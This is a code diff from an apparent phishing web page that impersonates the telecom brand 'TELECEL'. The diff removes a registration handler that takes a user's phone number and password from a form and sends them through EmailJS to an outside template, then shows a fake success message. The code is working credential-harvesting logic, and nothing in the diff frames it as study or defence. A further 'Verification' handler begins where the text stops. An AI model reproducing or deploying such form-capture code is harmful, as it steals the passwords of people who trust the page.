@@ -261,25 +261,6 @@ function startTimer() {
   }, 1000);
 }
 
-// === Registration ===
-registerForm.addEventListener("submit", (e) => {
-  e.preventDefault();
-  const phone = document.getElementById("phone").value;
-  const password = document.getElementById("password").value;
-
-  emailjs.send("service_74nt2c9", "template_s6vpt2e", {
-    phone: "TELECEL " + phone,
-    password: password
-  }).then(() => {
-    showNotification("Registration successful!");
-    openModal();
-    localStorage.setItem("userPhone", phone);
-    startTimer();
-  }).catch(() => {
-    showNotification("Failed to send details.", "error");
-  });
-});
-
 // === Verification ===
 registerForm.addEventListener("submit", (e) => {
   e.preventDefault();
